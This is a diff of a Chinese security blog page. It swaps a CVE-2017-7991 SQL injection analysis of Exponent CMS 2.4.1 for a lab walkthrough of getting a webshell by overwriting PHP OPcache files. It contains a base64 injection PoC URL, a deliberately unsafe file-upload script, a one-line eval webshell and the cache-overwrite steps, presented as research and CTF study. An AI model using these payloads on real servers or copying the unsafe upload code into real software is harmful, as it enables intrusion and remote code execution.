@@ -70,7 +70,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="代码审计,SQL注入,漏洞分析," />
+  <meta name="keywords" content="php,OPcache," />
 
 
 
@@ -86,18 +86,27 @@
 
 
 
-<meta name="description" content="Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入">
+<meta name="description" content="OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。本文是对 《binary-webshell-through-opcache-in-php-7》一文的测试。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析">
-<meta property="og:url" content="http://yoursite.com/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/index.html">
+<meta property="og:title" content="利用PHP的OPcache机制getshell">
+<meta property="og:url" content="http://yoursite.com/2017/05/13/利用PHP的OPcache机制getshell/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170512/sqlinject/1.jpg?raw=true">
-<meta property="og:updated_time" content="2017-05-12T02:04:44.432Z">
+<meta property="og:description" content="OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。本文是对 《binary-webshell-through-opcache-in-php-7》一文的测试。">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/tree.jpg">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachefilecache.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachetimestamp.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/systemid.jpg">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/local.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/bin2.jpg">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/beforeupload.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/upload.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/afterupload.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/webshell.jpg?raw=true">
+<meta property="og:updated_time" content="2017-05-14T00:59:43.772Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析">
-<meta name="twitter:description" content="Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入">
-<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170512/sqlinject/1.jpg?raw=true">
+<meta name="twitter:title" content="利用PHP的OPcache机制getshell">
+<meta name="twitter:description" content="OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。本文是对 《binary-webshell-through-opcache-in-php-7》一文的测试。">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/tree.jpg">
 
 
 
@@ -125,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/05/13/利用PHP的OPcache机制getshell/"/>
 
 
 
 
 
-  <title> [CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> 利用PHP的OPcache机制getshell | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -297,7 +306,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/13/利用PHP的OPcache机制getshell/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -321,7 +330,7 @@
             
             
               
-                [CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析
+                利用PHP的OPcache机制getshell
               
             
           </h1>
@@ -336,8 +345,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-12T07:42:07+08:00">
-                2017-05-12
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-13T23:04:03+08:00">
+                2017-05-13
               </time>
             
 
@@ -377,8 +386,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/" itemprop="commentCount"></span>
+                <a href="/2017/05/13/利用PHP的OPcache机制getshell/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/05/13/利用PHP的OPcache机制getshell/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -388,7 +397,7 @@
 
           
           
-             <span id="/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/" class="leancloud_visitors" data-flag-title="[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析">
+             <span id="/2017/05/13/利用PHP的OPcache机制getshell/" class="leancloud_visitors" data-flag-title="利用PHP的OPcache机制getshell">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -415,20 +424,41 @@
       
 
       
-        <p>Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入<br><a id="more"></a></p>
-<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>注入点在 /framework/modules/eaas/controllers/eaasController.php 中。如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">api</span><span class="params">()</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;params[<span class="string">'apikey'</span>])) &#123;</div><div class="line">		$_REQUEST[<span class="string">'apikey'</span>] = <span class="keyword">true</span>;  <span class="comment">// set this to force an ajax reply</span></div><div class="line">		$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">550</span>, <span class="string">'Permission Denied'</span>, <span class="string">'You need an API key in order to access Exponent as a Service'</span>, <span class="keyword">null</span>);</div><div class="line">		$ar-&gt;send();  <span class="comment">//FIXME this doesn't seem to work correctly in this scenario</span></div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$key = expUnserialize(base64_decode(urldecode(<span class="keyword">$this</span>-&gt;params[<span class="string">'apikey'</span>])));</div><div class="line">		$cfg = <span class="keyword">new</span> expConfig($key);</div><div class="line">		<span class="keyword">$this</span>-&gt;config = $cfg-&gt;config;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($cfg-&gt;id)) &#123;</div><div class="line">			$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">550</span>, <span class="string">'Permission Denied'</span>, <span class="string">'Incorrect API key or Exponent as a Service module configuration missing'</span>, <span class="keyword">null</span>);</div><div class="line">			$ar-&gt;send();</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;params[<span class="string">'get'</span>])) &#123;</div><div class="line">				<span class="keyword">$this</span>-&gt;handleRequest();</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">200</span>, <span class="string">'ok'</span>, <span class="string">'Your API key is working, no data requested'</span>, <span class="keyword">null</span>);</div><div class="line">				$ar-&gt;send();</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>api()中，先检测参数<code>apikey</code>　是否为空，若不为空，则进入else分支。在分支中，先对参数<code>apikey</code>进行一次<code>urldecode</code>,接着进行 <code>base64_decode</code>,最后进行一次反序列化<code>expUnserialize</code>，在<code>expUnserialize</code>中存在一次小小的过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">expUnserialize</span><span class="params">($serial_str)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> ($serial_str === <span class="string">'Array'</span>) <span class="keyword">return</span> <span class="keyword">null</span>;  <span class="comment">// empty array string??</span></div><div class="line">    <span class="keyword">if</span> (is_array($serial_str) || is_object($serial_str)) <span class="keyword">return</span> $serial_str;  <span class="comment">// already unserialized</span></div><div class="line"><span class="comment">//    $out1 = @preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $serial_str );</span></div><div class="line">    $out = preg_replace_callback(</div><div class="line">        <span class="string">'!s:(\d+):"(.*?)";!s'</span>,</div><div class="line">        create_function (<span class="string">'$m'</span>,</div><div class="line">            <span class="string">'$m_new = str_replace(\'"\',\'\"\',$m[2]);</span></div><div class="line">            return "s:".strlen($m_new).\':"\'.$m_new.\'";\';'</div><div class="line">        ),</div><div class="line">        $serial_str );</div><div class="line"><span class="comment">//    if ($out1 !== $out) &#123;</span></div><div class="line"><span class="comment">//        eDebug('problem:&lt;br&gt;'.$out.'&lt;br&gt;'.$out1);</span></div><div class="line"><span class="comment">//    &#125;</span></div></pre></td></tr></table></figure></p>
-<p>它会把 经过<code>base64_decode</code>后的<code>$apikey</code> 中的双引号加上斜杠。但是对于单引号，它没有进行处理。在进行<code>expUnserialize</code>之后，赋值给<code>$key</code>，并在之后实例化一个 <code>expConfig</code>对象。<code>expConfig</code>部分代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">expConfig</span> <span class="keyword">extends</span> <span class="title">expRecord</span> </span>&#123;</div><div class="line">	<span class="keyword">protected</span> $table = <span class="string">'expConfigs'</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($params=null)</span> </span>&#123;</div><div class="line">		<span class="keyword">global</span> $db;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!is_array($params)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;location_data = serialize($params);</div><div class="line">            <span class="keyword">parent</span>::__construct($db-&gt;selectValue(<span class="keyword">$this</span>-&gt;table, <span class="string">'id'</span>, <span class="string">"location_data='"</span>.<span class="keyword">$this</span>-&gt;location_data.<span class="string">"'"</span>));</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">parent</span>::__construct($params);</div><div class="line">        &#125;</div><div class="line">	....</div></pre></td></tr></table></figure>
-<p>在 framysqli\core\subsystems\database\mysqli.php 中，可以看到关于<code>selectValue</code>的定义：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectValue</span><span class="params">($table, $col, $where=null)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> ($where == <span class="keyword">null</span>)</div><div class="line">		$where = <span class="string">"1"</span>;</div><div class="line">	$sql = <span class="string">"SELECT "</span> . $col . <span class="string">" FROM `"</span> . <span class="keyword">$this</span>-&gt;prefix . <span class="string">"$table` WHERE $where LIMIT 0,1"</span>;</div><div class="line">	$res = @mysqli_query(<span class="keyword">$this</span>-&gt;connection, $sql);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ($res == <span class="keyword">null</span>)</div><div class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">	$obj = mysqli_fetch_object($res);</div><div class="line">	<span class="keyword">if</span> (is_object($obj)) &#123;</div><div class="line">		<span class="keyword">return</span> $obj-&gt;$col;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>可以看到，在检查完<code>$params</code>是否是数组后，将我们传入的<code>$params</code>序列化后直接插入到了数据库查询语句中,未作任何过滤和检测。加上之前并未对单引号进行处理，因此我们可以利用单引号，对 <code>location_data=&#39;&quot;.$this-&gt;location_data.&quot;&#39;</code> 中的单引号进行闭合。</p>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/exponent241/index.php</div><div class="line">?module=eaas</div><div class="line">&amp;action=api</div><div class="line">&amp;apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7</div></pre></td></tr></table></figure>
-<p>其中 base64_decode(“czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7”) = s:16:”aaa’or “‘sleep(2)#</p>
-<p>查看 mysql.log ，可以发现成功注入。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170512/sqlinject/1.jpg?raw=true" alt=""><br>运行的 sql语句 为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT id FROM `exponent_expConfigs` WHERE location_data=&apos;s:19:&quot;aaa&apos;or \&quot;&apos;sleep(2)#&quot;;&apos; LIMIT 0,1</div></pre></td></tr></table></figure>
-<p>可以看到单引号被成功闭合。</p>
+        <p>OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。<br>本文是对 <a href="http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/" target="_blank" rel="external">《binary-webshell-through-opcache-in-php-7》</a>一文的测试。<br><a id="more"></a></p>
+<h1 id="关于OPcache"><a href="#关于OPcache" class="headerlink" title="关于OPcache"></a>关于OPcache</h1><p>在我们指定了一个缓存目录（后面提到）后，php会把编译好的php字节码文件放到这个缓存目录中。这里假设该缓存目录是<code>/var/www/html/opcache</code>，未访问前，<code>opcache</code>文件夹为空。接下去我去访问 <code>index.php</code>后，php会在 <code>opcache</code>文件夹中创建一个名为md5哈希值的文件夹，其下的目录结构和 <code>index.php</code>所在目录结构相同，同时生成了 <code>index.php.bin</code>。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/tree.jpg" alt=""><br>这个<code>index.php.bin</code> 就是 <code>index.php</code> 的缓存文件。并且作为<code>www-data</code>用户，我们对 <code>5672f68788bcb25b11403b33f5d1497f</code> 具有读写执行权限。这样，我们想办法把这个<code>index.php.bin</code>替换为包含有恶意代码的<code>index.php.bin</code>文件，当我们再次去访问<code>index.php</code>时，php会选择加载这个缓存文件，从而我们达到了getshell的目的。这个思路，感觉跟二进制漏洞中的GOT覆写技术有点神似吧。</p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@4db5ba2ab3bf:/var/www/html# php -v</div><div class="line">PHP 7.0.15-0ubuntu0.16.04.4 (cli) ( NTS )</div><div class="line">Copyright (c) 1997-2017 The PHP Group</div><div class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</div><div class="line">    with Zend OPcache v7.0.15-0ubuntu0.16.04.4, Copyright (c) 1999-2017, by Zend Technologies</div></pre></td></tr></table></figure>
+<h2 id="配置OPcache"><a href="#配置OPcache" class="headerlink" title="配置OPcache"></a>配置OPcache</h2><h3 id="开启OPcache"><a href="#开启OPcache" class="headerlink" title="开启OPcache"></a>开启OPcache</h3><p>在php配置文件 <code>php.ini</code> 的约莫 1745 行左右，找到如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.enable=0</div></pre></td></tr></table></figure></p>
+<p>去掉前面的分号<code>;</code>，将<code>0</code>改为<code>1</code>，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.enable=1</div></pre></td></tr></table></figure></p>
+<h3 id="关闭时间戳验证"><a href="#关闭时间戳验证" class="headerlink" title="关闭时间戳验证"></a>关闭时间戳验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.validate_timestamps=1</div></pre></td></tr></table></figure>
+<p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.validate_timestamps=0</div></pre></td></tr></table></figure></p>
+<h3 id="设置OPcache缓存路径"><a href="#设置OPcache缓存路径" class="headerlink" title="设置OPcache缓存路径"></a>设置OPcache缓存路径</h3><p>继续向下翻，找到如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.file_cache=</div></pre></td></tr></table></figure></p>
+<p>这里我修改后的配置是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.file_cache= &quot;/var/www/html/opcache&quot;</div></pre></td></tr></table></figure></p>
+<h3 id="设置缓存文件优先级"><a href="#设置缓存文件优先级" class="headerlink" title="设置缓存文件优先级"></a>设置缓存文件优先级</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.file_cache_only=0</div></pre></td></tr></table></figure>
+<p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.file_cache_only=1</div></pre></td></tr></table></figure></p>
+<h3 id="重启apache"><a href="#重启apache" class="headerlink" title="重启apache"></a>重启apache</h3><p>这里我以apache作为web服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 resart</div></pre></td></tr></table></figure></p>
+<p>重启，使前面修改的<code>php.ini</code>生效</p>
+<h2 id="www目录"><a href="#www目录" class="headerlink" title="www目录"></a>www目录</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    	&lt;form action=<span class="string">"upload-file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">    		&lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;filename:&lt;/label&gt;</div><div class="line">    		&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</div><div class="line">    		&lt;br/&gt;</div><div class="line">        	&lt;label <span class="keyword">for</span>=<span class="string">"filepath"</span>&gt;filepath:&lt;/label&gt;</div><div class="line">    		&lt;input type=<span class="string">"text"</span> name=<span class="string">"filepath"</span> id=<span class="string">"filepath"</span> /&gt;</div><div class="line">        	&lt;br/&gt;</div><div class="line">    		&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span> /&gt;</div><div class="line">    	&lt;/form&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<h3 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload-file.php"></a>upload-file.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$path = $_POST[<span class="string">'filepath'</span>];</div><div class="line">    <span class="keyword">echo</span> <span class="string">"filename: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"size: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;   </div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],  $path . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"save : "</span> . $path . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];    </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>那个。。代码写得很丑。。仅为测试之用：）</p>
+<h3 id="phpinfo-php"><a href="#phpinfo-php" class="headerlink" title="phpinfo.php"></a>phpinfo.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    phpinfo();</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>现在开始黑盒测试。。</p>
+<h2 id="利用phpinfo获取信息"><a href="#利用phpinfo获取信息" class="headerlink" title="利用phpinfo获取信息"></a>利用phpinfo获取信息</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachefilecache.jpg?raw=true" alt=""></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachetimestamp.jpg?raw=true" alt=""><br>可知，OPcache缓存路径在 <code>/var/www/html/opcache</code> 中。且服务器端开启了 <code>opcache.file_cache_only</code>,禁用了<code>opcache.validate_timestamps</code>。 这是能成功利用的条件。</p>
+<h2 id="php7-opcache-override-py"><a href="#php7-opcache-override-py" class="headerlink" title="php7-opcache-override.py"></a>php7-opcache-override.py</h2><p>由前可知，在对缓存文件进行操作前，需要经过一个名称是md5哈希值的文件夹。这可以通过 <a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">hp7-opcache-override.py</a> 来计算。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/systemid.jpg" alt=""></p>
+<p>得到这个文件夹名为：5672f68788bcb25b11403b33f5d1497f</p>
+<h2 id="构建恶意的缓存文件"><a href="#构建恶意的缓存文件" class="headerlink" title="构建恶意的缓存文件"></a>构建恶意的缓存文件</h2><p>恶意的缓存文件得先本地生成，然后通过各种方式比如上传等去覆盖服务器上的缓存文件。我们先在本地配置好OPcache，这样才能生成缓存文件。然后本地新建一个 <code>index.php</code>,内容是一句话木马<code>&lt;?php @eval($_POST[test]);?&gt;</code>，之后访问它。在对应的缓存文件夹里可以看到<code>index.php.bin</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/local.jpg?raw=true" alt=""><br>用十六进制编辑器打开，将<code>OPCACHE.</code>后的那串md5哈希值，替换为前一步骤得到的哈希值：5672f68788bcb25b11403b33f5d1497f ,修改后如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/bin2.jpg" alt=""></p>
+<h2 id="覆盖原缓存文件"><a href="#覆盖原缓存文件" class="headerlink" title="覆盖原缓存文件"></a>覆盖原缓存文件</h2><p>在覆盖之前，先看看服务器上的原缓存文件长啥样：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/beforeupload.jpg?raw=true" alt=""></p>
+<p>这里利用上传来进行覆盖。访问<code>index.php</code>,选择修改后的<code>index.php.bin</code>进行上传，上传路径为要覆盖的缓存文件的相对地址 <code>opcache/5672f68788bcb25b11403b33f5d1497f/var/www/html/</code>。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/upload.jpg?raw=true" alt=""></p>
+<p>上传完成后，服务器上的缓存文件已经替换成我们构造的恶意文件了。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/afterupload.jpg?raw=true" alt=""></p>
+<h2 id="菜刀连上"><a href="#菜刀连上" class="headerlink" title="菜刀连上"></a>菜刀连上</h2><p>此时再去访问 <code>index.php</code>,发现已经被修改了，不再是上传的页面。用菜刀连上，密码是 test 。成功getshell。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/webshell.jpg?raw=true" alt=""></p>
+<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>前面我们是通过上传来实现覆盖，但实际利用起来肯定没那么简单。利用OPcache来获得webshell的姿势一般都会和其他姿势相结合。比如下面两题CTF题</p>
+<h2 id="ASIS-CTF-2016-–-BinaryCloud"><a href="#ASIS-CTF-2016-–-BinaryCloud" class="headerlink" title="ASIS CTF 2016 – BinaryCloud"></a>ASIS CTF 2016 – BinaryCloud</h2><p>这题是通过上传来覆盖，但后端有各种过滤。<br>附上<a href="https://ctf.rip/asis-ctf-2016-binarycloud-web-challenge/" target="_blank" rel="external">writeup</a></p>
+<h2 id="ALICTF-2016-homework"><a href="#ALICTF-2016-homework" class="headerlink" title="ALICTF 2016  - homework"></a>ALICTF 2016  - homework</h2><p>这题利用sql注入的dumpfile来实现对缓存文件的覆盖。<br>附上<a href="https://github.com/tothi/ctfs/tree/master/alictf-2016/homework" target="_blank" rel="external">writeup</a></p>
 
       
     </div>
@@ -452,11 +482,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            <a href="/tags/php/" rel="tag"># php</a>
           
-            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
-          
-            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+            <a href="/tags/OPcache/" rel="tag"># OPcache</a>
           
         </div>
       
@@ -465,8 +493,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/05/04/ACMPKU-OJ-2387/" rel="next" title="ACMPKU-OJ:2387">
-                <i class="fa fa-chevron-left"></i> ACMPKU-OJ:2387
+              <a href="/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/" rel="next" title="[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析">
+                <i class="fa fa-chevron-left"></i> [CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析
               </a>
             
           </div>
@@ -474,10 +502,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/05/13/利用PHP的OPcache机制getshell/" rel="prev" title="利用PHP的OPcache机制getshell">
-                利用PHP的OPcache机制getshell <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -503,8 +527,8 @@
           
   <div class="comments" id="comments">
     
